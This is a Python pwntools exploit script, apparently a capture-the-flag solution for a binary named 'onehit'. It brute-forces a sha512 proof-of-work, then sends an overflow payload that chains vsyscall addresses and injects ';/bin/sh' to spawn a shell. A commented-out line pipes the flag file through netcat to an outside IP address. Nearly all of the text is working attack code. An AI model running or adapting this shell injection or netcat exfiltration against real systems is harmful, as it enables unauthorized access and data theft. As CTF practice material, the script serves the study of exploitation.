#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from hashlib import sha512
import re
context.binary = "./onehit"
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

io = process("./onehit", env = {"LD_PRELOAD": "./libc-2.27.so"})

def DEBUG(bps = []):
    cmd = "set follow-fork-mode parent\n"
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
    cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)


def get_interger():
    prefix, head =  re.findall('"([A-Z]+)".*0x([0-9a-f]+)', io.recvuntil("The interger"))[0]
    #  print prefix, head
    for i in range(0, 0x1fffff)[::-1]:
        if sha512(prefix + str(i)).hexdigest().startswith(head):
            return i
    else:
        log.error("Not Found!!!")

if __name__ == "__main__":
    io.sendlineafter(" = ", str(get_interger()))
    io.sendlineafter("al?\n", "yes")
    DEBUG([0xEA0, 0xF13])
    io.sendlineafter("sh\n", "1")

    '''
    .text:000000000004F43A                 add     rdi, 7Fh
    .text:000000000004F43E                 jmp     short loc_4F45B
    '''
    vsyscall = 0xffffffffff600000
    #  cmd = "cat flag| nc 58.87.66.225 9999\0"
    cmd = ";/bin/sh <&2 >&2\0"
    payload = cyclic(0xE0 + 8 - 145) + cmd 
    payload = payload.ljust(0xE0 + 8, '\0') + p64(vsyscall) * 30 + "aaa"
    io.sendafter("available\n", payload)

    io.interactive()
